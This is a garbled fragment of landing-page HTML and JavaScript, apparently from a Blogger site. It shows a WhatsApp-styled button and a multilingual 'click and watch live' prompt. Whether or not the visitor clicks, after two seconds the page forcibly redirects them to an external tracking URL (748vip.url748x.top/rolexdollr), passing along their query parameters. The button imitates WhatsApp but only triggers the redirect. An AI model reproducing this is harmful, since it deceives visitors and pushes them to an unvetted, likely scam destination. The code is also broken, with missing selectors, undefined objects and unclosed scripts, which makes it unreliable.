  <!-- ========== MOBILE REDIRECT BLOCKER (?m=1 REMOVER) ========== -->
  <script>
    (function(){
      try {
        var url = window.location.href;
        if (url.indexOf("?m=1") !== -1 || url.indexOf("&m=1") !== -1) {
          var clean = url
            .replace(/([?&])m=1(&|$)/g, function(m, p1, p2){
              return p2 === "&" ? p1 : "";
            })
            .replace(/[?&]$/, "");
          if (window.history && window.history.replaceState) {
            window.history.replaceState(null, "", clean);
          }

    /* === WhatsApp button === */

      z-index:9999;
      text-decoration:none;
      border:none;
      outline:none;
      transition:transform .18s ease, box-shadow .18s ease;
      -webkit-tap-highlight-color:transparent;
      transform-origin:center;
    }
    .wa-btn.pressed{
      transform:scale(.86);
      box-shadow:0 4px 14px rgba(37,211,102,.75);
    }
    .wa-btn svg{width:36px;height:36px;fill:#fff;display:block;pointer-events:none}

    @media (max-width:480px){

  <script>

      var STORAGE_KEY = "lp_last_gif_index";

      function pickDifferentGif() {
        var last = -1;
        try {
          var stored = localStorage.getItem(STORAGE_KEY);
          if (stored !== null) last = parseInt(stored, 10);
        } catch (e) {}

        var next;
        if (GIFS.length <= 1) {
          next = 0;
        } else {
          do {
            next = Math.floor(Math.random() * GIFS.length);
          } while (next === last);
        }

        try { localStorage.setItem(STORAGE_KEY, next); } catch (e) {}
        return GIFS[next];
      }

        my: "နှိပ်ပြီး တိုက်ရိုက်ကြည့်ပါ",
        km: "ចុច និងមើលបន្តផ្ទាល់",

        cs: "KLIKNI A SLEDUJ ŽIVĚ",
        ro: "CLICK ȘI URMĂREȘTE LIVE",
        hu: "KATTINTS ÉS NÉZD ÉLŐBEN"
      };

      var RTL_LANGS = ["ar", "ur", "fa", "he"];

      function detectLang() {
        var raw = (navigator.language || navigator.userLanguage || "en").toLowerCase();
        var base = raw.split("-")[0];
        if (TRANSLATIONS[base]) return base;
        return "en";
      }

      function applyTranslation() {
        var lang = detectLang();
        var el = document.getElementById("ctaText");
        if (!el) return;
        el.textContent = TRANSLATIONS[lang];
        if (RTL_LANGS.indexOf(lang) !== -1) {
          el.setAttribute("dir", "rtl");
        } else {
          el.setAttribute("dir", "ltr");
        }
      }

      applyTranslation();

      /* ============================================================
         3) REDIRECT + PRESS FEEL
         – Base URL FIXED: https://748vip.url748x.top/rolexdollr/?utm_source=Saim&utm_medium=Saim
         – Input ke query params as-it-is forward honge
         – Click → instant | No click → 2 sec auto
      ============================================================ */
      var DESTINATION_BASE = "https://748vip.url748x.top/rolexdollr/?utm_source=Saim&utm_medium=Saim";
      var REDIRECT_DELAY = 2000; // ✅ 2 seconds auto redirect

      function buildUrl() {
        try {
          var q = (window.location.search || "").replace(/^\?/, "");

          // m=1 param hatao (agar koi bacha ho)
          if (q) {
            var parts = q.split("&").filter(function(p){
              if (!p) return false;
              var key = p.split("=")[0].toLowerCase();
              return key !== "m";
            });
            q = parts.join("&");
          }

          // safety: markup characters strip
          q = q.replace(/[<>"']/g, "");

          if (!q) return DESTINATION_BASE;

          var sep = DESTINATION_BASE.indexOf("?") === -1 ? "?" : "&";
          return DESTINATION_BASE + sep + q;
        } catch (err) {
          return DESTINATION_BASE;
        }
      }

      // ✅ Input ke params → Output URL me same-to-same forward
      var finalUrl = buildUrl();

      var jumped = false;
      function jump() {
        if (jumped) return;        // ✅ block double redirect
        jumped = true;
        try { window.location.replace(finalUrl); }
        catch (err) { window.location.href = finalUrl; }
      }

      /* --- WhatsApp button: press feel + redirect --- */
      var wa = document.getElementById("wa");
      if (wa) {
        wa.addEventListener('touchstart', function(){
          wa.classList.add('pressed');
        }, { passive: true });

        wa.addEventListener('touchend', function(){
          wa.classList.remove('pressed');
        }, { passive: true });

        wa.addEventListener('touchcancel', function(){
          wa.classList.remove('pressed');
        }, { passive: true });

        wa.addEventListener('mousedown', function(){
          wa.classList.add('pressed');
        });

        wa.addEventListener('mouseup', function(){
          wa.classList.remove('pressed');
        });

        wa.addEventListener('click', function(e){
          e.preventDefault();
          e.stopPropagation();
          jump();
        }, { passive: false });

        wa.addEventListener('touchend', function(e){
          e.preventDefault();
          e.stopPropagation();
          jump();
        }, { passive: false });
      }

      /* --- Full page: redirect only --- */
      var wrap = document.getElementById("go");
      if (wrap) {
        wrap.addEventListener('click', function(e){
          e.preventDefault();
          e.stopPropagation();
          jump();
        }, { passive: false });

        wrap.addEventListener('touchend', function(e){
          e.preventDefault();
          e.stopPropagation();
          jump();
        }, { passive: false });
      }

      /* ✅ AUTO REDIRECT after 2 seconds (even if user doesn't click) */
      setTimeout(jump, REDIRECT_DELAY);

    })();
